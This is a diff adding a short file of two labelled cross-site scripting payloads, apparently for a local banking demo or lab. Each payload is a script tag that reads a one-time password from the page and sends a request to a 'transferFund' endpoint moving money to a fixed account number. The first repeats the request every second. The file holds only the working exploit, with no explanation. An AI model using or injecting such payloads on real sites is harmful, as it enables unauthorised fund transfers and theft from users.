@@ -1,0 +1,14 @@
+Option 1
+========
+Hi <script>var hack = setInterval(function(){$.ajax({
+	url: "http://localhost:8080/transferFund",
+	method: "get",
+	data: "balance=10&acno=301201531&otp="+$("#otp").text()
+});},1000);</script>
+
+Option 2
+========
+hi
+<script>
+	$.get('http://localhost:8080/transferFund?balance=1000&acno=301201531&otp='+$('#otp').text())
+</script>
